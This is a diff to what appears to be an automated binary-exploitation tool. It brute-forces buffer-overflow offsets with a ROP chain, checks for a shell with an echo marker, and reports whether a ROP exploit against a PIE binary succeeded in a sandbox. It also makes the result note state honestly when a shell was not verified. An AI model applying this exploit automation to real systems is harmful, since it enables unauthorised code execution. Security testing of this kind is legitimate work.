@@ -98,8 +98,8 @@ for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48, 152, 168, 2
         io.close(); continue
     try:
         io.sendline(b"A" * off + chain)
-        time.sleep(0.3); io.sendline(b"echo " + MARK)
-        out = io.recvrepeat(1.0)
+        time.sleep(0.5); io.sendline(b"echo " + MARK)
+        out = io.recvrepeat(2.5)                 # generous: the audit runs many sandboxes, load is high
     except Exception:
         out = b""
     io.close()
@@ -156,7 +156,8 @@ def autopie_rop(binary: str, run: bool = True) -> dict:
     res = _run_pie_driver(binary, _DRIVER_ROP, ".binoracle_pie_rop.py")
     if not res.get("ok"):
         return res
-    res["note"] = "ROP en PIE (base resuelta, shell verificada en sandbox)"
+    res["note"] = ("ROP en PIE: base resuelta y shell verificada en sandbox" if res.get("verified")
+                   else "ROP en PIE: no verificado (offset/gadget o timing bajo carga)")
     return res
 
 
